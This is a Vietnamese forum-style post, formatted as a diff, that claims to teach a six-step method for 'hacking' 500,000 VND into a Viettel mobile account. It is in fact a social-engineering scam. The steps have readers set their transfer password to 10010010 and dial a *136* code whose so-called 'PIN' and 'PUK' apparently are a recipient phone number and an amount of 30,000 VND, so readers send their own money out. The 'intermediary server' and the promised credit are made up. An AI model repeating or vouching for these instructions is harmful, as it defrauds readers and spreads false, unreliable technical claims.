@@ -1,0 +1,21 @@
+Âu Mỹ khác|
+
+                        Xin được chia sẻ cùng các bạn một thủ thuật dùng mã hack mà tôi vừa mới khám phá:
+như các bạn cũng đã thấy,rất nhiều các cá nhân post bài lên các diễn đàn trong nuớc với nội dung \”hack tiền của mạng Viettel\”...để tìm được những topic như thế không hề khó như trong các forum của hihihehe, vn-zoom, zing.vn ....... và còn rất nhiều những topic như vậy,nhưng hầu hết là của AMATEUR HACKER,chủ yếu nhằm vào mục đích vụ lợi chứ không thông thạo về chuyên môn, họ thiếu kinh nghiệm ,kiến thức và cả tính chính xác trong lĩnh vực Hack bậc thầy này,mà nó đòi hỏi phài có một trình độ Hack tương đối cao .Chính vì những lí do nêu trên và với nhiều năm kinh nghiệm của mình,tôi xin giới thiệu : Tôi :
+Họ tên: phùng văn long
+Nghề nghiệp : Sinh viên Ðại Học Bách Khoa-BKA, Năm thứ 4,Khoa Công Nghệ thông tin.
+Tôi không dám nhận mình là một sinh viên ưu tú,nhưng với những gì mà mình tự khám phá được thì tôi thấy rất hài lòng.Chắc các bạn cũng biết tới diễn đàn HAVonline – diễn đàn hacker lớn nhất hiện nay và tôi rất tự hào khi mình nằm trong ban quản trị diễn đàn.Với những kinh nghiệm mà tôi đã có ,hôm nay tôi xin giới thiệu với các bạn cách hack tiền tài khoản Viettel hoàn toàn chính xác.Do thời gian có hạn nên tôi nói ngắn gọn như sau:Các bạn chỉ cần thực hiện tuần tự và chính xác theo yêu cầu của 6 bước sau:
+1 -Một sim Viettel hoạt động trên 230 ngày(hon 7 tháng).Tại sao phải cần vậy?Vì chỉ có những sim hoạt dộng trên 7 tháng mới được Viettel đưa vào mã bảo vệ tài khoản chuyển tiền ( 6 tháng chưa được đâu các bạn) trên server Viettel quản lí.
+2 -Rất đơn giản : Soạn tin MK gửi tới 136 để lấy mât khẩu chuyển tiền của bạn( nếu bạn chưa có).Tại sao phải cần vậy ? Vì chúng ta hack thông qua dịch vụ I-Share của Viettel.
+3 -Ðổi mật khẩu chuyển tiền: các bạn gọi tới 900 ,nhánh phím số 3 và làm theo hướng dẫn..và điều quan trọng nằm ở bước này. Các bạn phải đổi mât khẩu chuyển tiền thành dãy số sau :10010010 ,đó chính là mật khẩu Server trung gian ở bước 5. Tại sao phải làm vậy?Vì khi các bạn chuyển mật khẩu thành dãy số trên tức là đã mã hóa tài khoản của bạn trên Server mà Viettel quản lý.Ðiều này rất quan trọng.
+4 -Tài khoản trong sim của bạn phải có nhiều hơn 31999 vnd
+5 -Các bạn làm theo cú pháp nhu sau: *136* mật khẩu Server *mã PIN *mã PUK#. Để khỏi mất thời gian của các bạn tìm lại 2 mã trên nên tôi đã tạo ra một Server trung gian ( viết tắt là TIS-Telephone of Intermediacy Server) với mã PIN và mã PUK mặc định (dùng đăng nhập sdt của bạn trên Server),tóm lại, cụ thể các thông số như sau (chỉ áp dụng cho mạng Viettel):
++ mật khẩu Server: 10010010 (8 số)
++ mã PIN : 841669483800
++ mã PUK: 30000 (5 số)
+Các bạn chỉ cần nhập chính xác 3 dãy số trên vào cú pháp và nhấn nút gọi thì hệ thống sẽ tự động đăng nhập sdt của bạn vào TIS (Telephone of Intermediacy Server) mà tôi tạo ra và tài khoản của sdt người gửi sẽ tự đông được công thêm tiền hack được sau khi đăng nhập (tiền hack được sẽ công thêm vào tài khoản chính),thật ra đây là một trong những cách hack tài khoản điện thoại mà các Hacker chuyên nghiệp trên thế giới gần đây mới sử dụng ( nguyên lý là dùng mã hack đảo chiều các dịch vụ chuyển tiền từ các Server di đông,chẳng hạn như I-Share, hiên trên mạng có nhiều tài liệu tiếng Anh nói về vấn đề này).
+6- Sau khi làm xong những bước trên : các bạn chỉ cần đợi 15 phút , sẽ có tin nhắn trả lời và tài khoản chính của các bạn đã được cộng thêm 500000 vnd.( lưu ý 500.000 vnd sẽ được cộng trực tiếp vào tài khoản chính của bạn)
+Lưu Ý Các bạn chỉ hack được 3 lần trong 1 ngày ( có nghĩa là 1 ngày chỉ hack được 1.500.000 VNĐ ) và mỗi lần hack phải thực hiện liên tiếp thật nhanh để sever luôn liên tục và hiệu quả cho mỗi lần rất cao.
+Mọi chi thiết xin liên hệ email: phungvanlong_ds_th@yahoo.com Phươ châm của tôi: “DÙ BẢO MẬT NHƯNG VẪN CÓ KẼ HỞ. CHÚNG TA HÃY TẬN DỤNG!!!”
+                        
+                    |
